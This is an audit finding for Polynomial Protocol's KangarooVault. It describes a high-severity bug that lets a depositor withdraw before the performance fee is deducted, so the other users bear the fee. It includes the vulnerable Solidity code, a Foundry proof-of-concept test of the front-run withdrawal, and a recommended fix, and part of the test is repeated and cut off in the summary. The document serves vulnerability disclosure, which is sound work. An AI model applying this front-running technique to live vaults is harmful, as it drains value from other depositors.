---
tags:
  - lang/solidity
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
  - sector/vault
protocol: "[[Polynomial Protocol]]"
auditors:
  - "[[peakbolt]]"
report: "https://code4rena.com/reports/2023-03-polynomial"
genome:
  - "[[fee-calculation]]"
  - "[[direct-drain]]"
  - "[[frontrun-exposure]]"
---
# [H-05] Uneven deduction of performance fee causes some KangarooVault users to lose part of their token value

- id: 20228
- impact: HIGH
- protocol: [[Polynomial Protocol]]
- reporter: peakbolt (Code4rena)
- source: https://code4rena.com/reports/2023-03-polynomial

## Summary


A bug has been identified in the `KangarooVault._resetTrade()` function of the `KangarooVault.sol` smart contract. This bug causes an uneven distribution of the `performanceFee` for the `KangarooVault` users. This happens because the `premiumCollected` is factored in the token price computation, while the `performanceFee` is not. This means that a user can evade the `performanceFee` and steal some of the funds from the rest by triggering `processWithdraw()` before the `performanceFee` is deducted from `KangarooVault`. The remaining users will be shortchanged and lose part of their token value as they bear the charges from the performance fee.

The bug has been demonstrated with a proof of concept, which adds the following imports and test case to `test/KangarooVault.t.sol`:

```
import {IVaultToken} from "../src/interfaces/IVaultToken.sol";

function testKangarooPerformanceFee() public {
    uint256 amt = 231e18;
    IVaultToken vaultToken = IVaultToken(kangaroo.VAULT_TOKEN());

    // deposit equal value for both user_2 and user 3 into KangarooVault
    uint256 depositAmt = 10e18;
    susd.mint(user_2, depositAmt);
    vm.startPrank(user_2);
    susd.approve(address(kangaroo), depositAmt);
    kangaroo.initiateDeposit(user_2, depositAmt);
    assertEq((vaultToken.balanceOf(user_2) * kangaroo.getTokenPrice())/1e18, depositAmt);
    vm.stopPrank();

    susd.mint(user_3, depositAmt);
    vm.startPrank(user_3);
    susd.approve(address(kangaroo), depositAmt);
    kangaroo.initiateDeposit(user_3, depositAmt);
    assertEq((vaultToken.balanceOf(user_2) * kangaroo.getTokenPrice())/1e18,

## Details


In `KangarooVault._resetTrade()`, a `performanceFee` is charged upon closing of all positions, on the `premiumCollected`. This is inconsistent with `getTokenPrice()` as `premiumCollected` is factored in the token price computation, while the `performanceFee` is not. This leads to an uneven distribution of the `performanceFee` for the `KangarooVault` users.

### Impact

That means a user can evade the `performanceFee` and steal some of the funds from the rest by triggering `processWithdraw()` before the `performanceFee` is deducted from `KangarooVault`. The remaining users will be shortchanged and lose part of their token value as they bear the charges from the performance fee.

**Detailed Explanation**

When all positions in `KangarooVault` are closed, `_resetTrade()` is triggered, which will proceed to deduct a `performanceFee` from the `premiumCollected`.

    function _resetTrade() internal {
        positionData.positionId = 0;
        (uint256 totalMargin,) = PERP_MARKET.remainingMargin(address(this));
        PERP_MARKET.transferMargin(-int256(totalMargin));
        usedFunds -= totalMargin;

        uint256 fees = positionData.premiumCollected.mulWadDown(performanceFee);
        if (fees > 0) SUSD.safeTransfer(feeReceipient, fees);

        totalFunds += positionData.premiumCollected - fees;
        totalFunds -= usedFunds;

        positionData.premiumCollected = 0;
        positionData.totalMargin = 0;
        usedFunds = 0;
    }

`KangarooVault.sol#L788-L789`

However, only `premiumCollected` is factored in the `getTokenPrice()` computation but not the `performanceFee`. That means the premiums are distributed among the users via token price, while the performance fee is not.

    function getTokenPrice() public view returns (uint256) {
        if (totalFunds == 0) {
            return 1e18;
        }

        uint256 totalSupply = getTotalSupply();
        if (positionData.positionId == 0) {
            return totalFunds.divWadDown(totalSupply);
        }

        uint256 totalMargin;

        (uint256 markPrice, bool isInvalid) = EXCHANGE.getMarkPrice();
        require(!isInvalid);
        (totalMargin, isInvalid) = PERP_MARKET.remainingMargin(address(this));
        require(!isInvalid);

        uint256 totalValue = totalFunds + positionData.premiumCollected + totalMargin + positionData.totalCollateral;
        totalValue -= (usedFunds + markPrice.mulWadDown(positionData.shortAmount));

        return totalValue.divWadDown(totalSupply);
    }

`KangarooVault.sol#L358-L359`

### Proof of Concept

Add the following imports and test case to `test/KangarooVault.t.sol`

    import {IVaultToken} from "../src/interfaces/IVaultToken.sol";

    function testKangarooPerformanceFee() public {
        uint256 amt = 231e18;
        IVaultToken vaultToken = IVaultToken(kangaroo.VAULT_TOKEN());

        // deposit equal value for both user_2 and user 3 into KangarooVault
        uint256 depositAmt = 10e18;
        susd.mint(user_2, depositAmt);
        vm.startPrank(user_2);
        susd.approve(address(kangaroo), depositAmt);
        kangaroo.initiateDeposit(user_2, depositAmt);
        assertEq((vaultToken.balanceOf(user_2) * kangaroo.getTokenPrice())/1e18, depositAmt);
        vm.stopPrank();

        susd.mint(user_3, depositAmt);
        vm.startPrank(user_3);
        susd.approve(address(kangaroo), depositAmt);
        kangaroo.initiateDeposit(user_3, depositAmt);
        assertEq((vaultToken.balanceOf(user_2) * kangaroo.getTokenPrice())/1e18, depositAmt);
        vm.stopPrank();

        skip(14500);
        kangaroo.processDepositQueue(2);


        // Open position at KangarooVault and execute the orders
        kangaroo.openPosition(amt, 0);
        skip(100);
        kangaroo.executePerpOrders(emptyData);
        kangaroo.clearPendingOpenOrders(0);

        // Simulate price drop to trigger profit from premium collection
        setAssetPrice(initialPrice - 100e18);

        // initiate withdrawal for both user_2 and user_3
        vm.prank(user_2);
        kangaroo.initiateWithdrawal(user_2, depositAmt);

        vm.prank(user_3);
        kangaroo.initiateWithdrawal(user_3, depositAmt);

        skip(14500);

        // close all position with gain from premium collection
        kangaroo.closePosition(amt, 1000000e18);
        skip(100);
        kangaroo.executePerpOrders(emptyData);


        // user_2 frontrun clearPendingCloseOrders() to withdraw at higher token price
        kangaroo.processWithdrawalQueue(1);
        assertEq(vaultToken.balanceOf(user_2), 0);
        assertEq(susd.balanceOf(user_2), 9693821343146274141);

        // This will trigger resetTrade and deduct performance Fee
        kangaroo.clearPendingCloseOrders(0);

        // user_3's withdrawal was processed but at a lower token price
        kangaroo.processWithdrawalQueue(1);
        assertEq(vaultToken.balanceOf(user_3), 0);
        assertEq(susd.balanceOf(user_3),9655768088211372841);

        // This shows that user_3 was shortchanged and lost part of token value, 
        // despite starting with equal token balance
        assertGt(susd.balanceOf(user_2), susd.balanceOf(user_3));
    }

### Recommended Mitigation Steps

Consider changing the following in `KangarooVault.sol#L359`

        totalValue -= (usedFunds + markPrice.mulWadDown(positionData.shortAmount) );

to

        totalValue -= (usedFunds + markPrice.mulWadDown(positionData.shortAmount) + positionData.premiumCollected.mulWadDown(performanceFee));

**[mubaris (Polynomial) confirmed](https://github.com/code-423n4/2023-03-polynomial-findings/issues/161#issuecomment-1495909266)**



***
